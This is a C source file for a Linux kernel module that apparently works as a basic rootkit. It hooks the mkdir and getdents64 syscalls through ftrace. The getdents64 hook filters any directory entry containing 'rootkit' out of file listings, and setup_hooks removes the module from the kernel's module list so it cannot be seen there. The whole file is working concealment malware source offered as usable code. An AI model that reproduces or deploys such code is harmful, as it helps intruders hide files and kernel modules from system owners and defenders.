#include "hook.h"

#include <linux/dirent.h>
#include <linux/ftrace.h>
#include <linux/linkage.h>
#include <linux/slab.h>
#include <linux/uaccess.h>

static char hooks_enabled = HOOKS_DISABLED;
static struct list_head *prev_mod;

// callback used by ftrace when rip hits one of our traced funcs.
// params allow checking for recursion by looking at rip & parent_rip
static void notrace ftrace_callback(unsigned long ip, unsigned long parent_ip,
                                    struct ftrace_ops *ops,
                                    struct pt_regs *regs)
{
    struct hook *hook = container_of(ops, struct hook, ops);

    // recursion safety:
    if (!within_module(parent_ip, THIS_MODULE))
    {
        regs->ip = (unsigned long)hook->hook_func;
    }
}

// Fills hook's address. Lookup is done by name.
static int find_hook_addr(struct hook *hook)
{
    if (!hook || !hook->name)
    {
        pr_err("hook: can't find address, hook is null or has no name.\n");
        return -1;
    }

    hook->addr = kallsyms_lookup_name(hook->name);

    if (!hook->addr)
    {
        pr_err("hook: couldn't find address for %s, unknown symbol.\n",
               hook->name);
        return -1;
    }

    *((unsigned long *)hook->orig_func) = hook->addr;

    return 0;
}

int setup_hook(struct hook *hook)
{
    int err;
    if ((err = find_hook_addr(hook)))
    {
        return -1;
    }

    hook->ops.func = ftrace_callback;
    hook->ops.flags = OPS;

    // Set filter to trigger hook only on this specific addr:
    if ((err = ftrace_set_filter_ip(&hook->ops, hook->addr, 0, 0)))
    {
        pr_err("hook: couldn't set ftrace filter for %s(0x%lx).\n", hook->name,
               hook->addr);
        return -1;
    }

    // Actually enable the hook:
    if ((err = register_ftrace_function(&hook->ops)))
    {
        pr_err("hook: couldn't register ftrace hook for %s(0x%lx).\n",
               hook->name, hook->addr);
        return -1;
    }

    return 0;
}

void remove_hook(struct hook *hook)
{
    int err;
    if ((err = unregister_ftrace_function(&hook->ops)))
    {
        pr_err("hook: couldn't unregister ftrace hook for %s(0x%lx).\n",
               hook->name, hook->addr);
    }

    if ((err = ftrace_set_filter_ip(&hook->ops, hook->addr, 1, 0)))
    {
        pr_err("hook: couldn't remove ftrace filter %s(0x%lx).\n", hook->name,
               hook->addr);
    }
}

/**
 * Hold declarations to real syscalls we're going to hook:
 * */
static asmlinkage long (*orig_mkdir)(const struct pt_regs *);
static asmlinkage long (*orig_getdents64)(const struct pt_regs *);

asmlinkage int hook_mkdir(const struct pt_regs *regs)
{
    char __user *pathname = (char *)regs->di;
    char dir_name[NAME_MAX] = { 0 };

    long error = strncpy_from_user(dir_name, pathname, NAME_MAX);

    if (error > 0)
    {
        printk(KERN_INFO "hook: trying to create directory %s.\n", dir_name);
    }
    orig_mkdir(regs);
    return 0;
}

asmlinkage long hook_getdents64(const struct pt_regs *regs)
{
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
    // Kernel-side copy of entry :
    struct linux_dirent64 *kernel_cpy = NULL;
    struct linux_dirent64 *cur_entry = NULL; // for looping through all dirents
    long sz, spoofed_sz;
    long i = 0;
    long error;

    if ((sz = orig_getdents64(regs)) <= 0)
    {
        /* pr_warn("hook: orig_getdents64 returned bad status: %ld", sz); */
        return sz;
    }
    spoofed_sz = sz;

    kernel_cpy = kmalloc(sz, GFP_KERNEL);
    if (!kernel_cpy)
    {
        pr_err("hook: couldn't allocate a kernel copy for dirent64.\n");
        return sz;
    }

    // Get dirent to kernel memory so we can alter it:
    error = copy_from_user(kernel_cpy, dirent, sz);
    if (error)
    {
        pr_err(
            "hook: couldn't copy user dirent to kernel buffer. (size: %ld)\n",
            sz);
        kfree(kernel_cpy);
        return -1;
    }

    while (i < sz)
    {
        cur_entry = (void *)kernel_cpy + i;
        if (strstr(cur_entry->d_name, "rootkit") != NULL)
        {
            long remaining = spoofed_sz - (i + cur_entry->d_reclen);
            spoofed_sz -= cur_entry->d_reclen;
            pr_info("hook: masking dirent `%s`.\n", cur_entry->d_name);
            memmove(cur_entry, (void *)cur_entry + cur_entry->d_reclen,
                    remaining);
            continue;
        }
        // only increment if we haven't shifted
        i += cur_entry->d_reclen;
    }

    if (spoofed_sz != sz)
    {
        pr_info("hook: shrunk dirent buffer: %ld -> %ld bytes.\n", sz,
                spoofed_sz);
    }

    // Copy our modified version back to the returned dirent:
    error = copy_to_user(dirent, kernel_cpy, sz);
    if (error)
    {
        pr_err("hook: couldn't copy modified dirent back to user buffer.\n");
        kfree(kernel_cpy);
        return -1;
    }

    kfree(kernel_cpy);
    return spoofed_sz;
}

#define HOOK_COUNT 2
static struct hook hooks[HOOK_COUNT] = { (struct hook){
                                             .name = "__x64_sys_mkdir",
                                             .hook_func = hook_mkdir,
                                             .orig_func = &orig_mkdir },
                                         (struct hook){
                                             .name = "__x64_sys_getdents64",
                                             .hook_func = hook_getdents64,
                                             .orig_func = &orig_getdents64,
                                         } };

int setup_hooks(void)
{
    int i;
    if (hooks_enabled == HOOKS_ENABLED)
    {
        pr_warn("hook: skipping setup, hooks are already enabled.\n");
        return 0;
    }
    for (i = 0; i < HOOK_COUNT; ++i)
    {
        int err = setup_hook(&hooks[i]);
        if (err)
        {
            pr_err("hook: couldn't setup hook for %s.\n", hooks[i].name);
            return 1;
        }
    }

    // hide from modules list:
    prev_mod = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);

    hooks_enabled = HOOKS_ENABLED;
    return 0;
}

int clear_hooks(void)
{
    int i;
    if (!hooks_enabled)
    {
        pr_warn("hook: skipping clearing, hooks are already disabled.\n");
        return 0;
    }
    for (i = 0; i < HOOK_COUNT; ++i)
    {
        remove_hook(&hooks[i]);
    }

    // unhide from modules list:
    list_add(&THIS_MODULE->list, prev_mod);

    hooks_enabled = HOOKS_DISABLED;
    return 0;
}

int toggle_hooks(void)
{
    if (hooks_enabled == HOOKS_ENABLED)
    {
        clear_hooks();
    }
    else
    {
        setup_hooks();
    }
    return hooks_enabled;
}

char hook_status(void)
{
    return hooks_enabled;
}
